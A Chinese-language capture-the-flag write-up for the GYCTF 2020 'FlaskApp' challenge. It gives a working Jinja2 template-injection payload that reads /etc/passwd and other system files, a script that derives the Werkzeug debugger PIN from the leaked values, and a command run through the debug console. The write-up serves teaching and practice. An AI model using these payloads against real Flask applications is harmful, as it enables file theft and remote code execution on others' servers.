# GYCTF 2020

## FlaskApp

进入是个Flask的base64加密解密页面

考虑SSTI咯

试了一下``base64decode(base64encode({{1+1}}))``会返回2

然后就开始找

```python
{{().__class__.__bases__[0].__subclasses__()[0].__init__}}
````

哪个被重载

75可以用

```
结果 ： &lt;function _ModuleLock.__init__ at 0x7f070fc12290&gt;
```

然后就是``__globals__.__builtins__[]``

发现eval不能用,用open可以读,但是似乎flag也被过滤了，

```
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']("/etc/passwd").read()}}
```

这个时候也发现存在报错界面，提示了是在调试模式，考虑拿Flask的PIN

需要拿到：
> username:就是启动这个Flask的用户
>
> modname为flask.app
>
> getattr(app, '__name__', getattr(app.__class__, '__name__'))为Flask
>
> getattr(mod, '__file__', None)为flask目录下的一个app.py的绝对路径
>
>uuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式
>
>get_machine_id() /etc/machine-id或者 /proc/sys/kernel/random/boot_i中的值
> 
>假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\\Microsoft\\Cryptography的值
>假如是Docker机 那么为 /proc/self/cgroup docker行

通过``open().read()``拿到这些值

```
username: flaskweb // /etc/passwd
modname: flask.app
getattr(app, '__name__', getattr(app.__class__, '__name__')):Flask
getattr(mod, '__file__', None): /usr/local/lib/python3.7/site-packages/flask/app.py //报错信息
uuid.getnode():  str(02:42:ae:01:17:04)=2485410404100 // /sys/class/net/eth0/address
get_machine_id(): b7372b2e7d533d8845c8f8d5aa5086ad9f8d5e16693d990ffe49ed4f55c190fd // /proc/self/cgroup
```

跑脚本

```
import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.7/site-packages/flask/app.py',
]

private_bits = [
    '2485410404100',
    'b7372b2e7d533d8845c8f8d5aa5086ad9f8d5e16693d990ffe49ed4f55c190fd'
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

然后再报错界面就可以执行任意代码了

```
import os
os.popen("ls /").read()
```

## 参考资料

Flask debug pin安全问题：

https://xz.aliyun.com/t/2553
